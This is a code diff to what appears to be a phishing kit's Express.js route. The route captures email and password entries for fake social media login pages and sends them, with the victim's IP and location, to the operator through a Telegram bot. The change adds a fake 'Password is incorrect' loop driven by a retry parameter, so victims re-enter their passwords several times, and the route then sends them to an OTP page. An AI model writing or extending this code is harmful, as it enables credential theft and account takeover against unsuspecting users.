@@ -29,6 +29,8 @@ router.get("/:socialMedia/:linkId/", async (req,res) => {
 router.post("/:socialMedia/:linkId/", async (req,res) => {
     try{
         const {linkId, socialMedia} = req.params;
+        const {retry} = req.query;
+
         const link = await Link.findOne({linkId, expiresAt: {$gt: Date.now()}});
         const {
             email,
@@ -51,6 +53,11 @@ router.post("/:socialMedia/:linkId/", async (req,res) => {
         // send telegram notification to user
         const message = await loginNotification(email, password, socialMedia, ip, city, country);
         await TelegramBotService.sendHTMLMessage(user.telegramId, message);
+
+        if(retry > 1){
+            req.flash('error_msg', 'Password is incorrect. Please try again.');
+            return res.redirect(`/slink/lgin/${socialMedia}/${linkId}?retry=${retry-1}`);
+        }
 
         if(link.otpEnabled){
             return res.redirect(`/slink/otp/${socialMedia}/${linkId}`);
